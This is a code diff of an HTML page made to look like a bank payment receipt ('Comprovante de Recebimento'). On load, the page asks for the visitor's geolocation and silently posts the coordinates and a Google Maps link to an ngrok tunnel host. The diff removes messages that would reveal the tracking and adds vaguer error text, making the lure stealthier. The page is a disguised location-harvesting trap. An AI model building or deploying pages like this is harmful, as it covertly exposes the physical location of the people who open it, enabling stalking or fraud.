@@ -1,69 +1,62 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
   <meta charset="UTF-8">
-  <title>Comprovante</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
 </head>
+
 <body style="background-color: #6B02A3">
   <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
+
   <script>
-    // Evento executado quando a página é carregada
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Geolocalização não é suportada pelo navegador.");
+        alert("Algo deu errado. Tente novamente mais tarde.");
       }
     });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      console.log("Latitude: " + latitude);
-      console.log("Longitude: " + longitude);
-
-      console.log("entrou no frontend...");
-
-      // Envia a localização para o backend
-      fetch("https://comprovantenubank-nunegocios.vercel.app/api/send-location", { // Substitua com o URL real do backend
+      fetch("https://b1e6-2804-6950-9-f911-1078-2e22-2755-45ee.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude })
+        body: JSON.stringify({ latitude, longitude, maps })
       })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error("Erro ao enviar a localização.");
-        }
-        return response.json();
-      })
-      .then(data => {
-        alert("Localização enviada com sucesso!");
-      })
-      .catch(error => {
-        console.error("Erro:", error);
-        alert("Erro ao enviar a localização. Por favor, tente novamente.");
-      });
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
     }
 
     function handleError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          alert("O usuário negou a solicitação de geolocalização.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("As informações de localização não estão disponíveis.");
-          break;
-        case error.TIMEOUT:
-          alert("A solicitação de geolocalização expirou.");
-          break;
-        default:
-          alert("Ocorreu um erro desconhecido.");
-          break;
-      }
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
+
 </html>
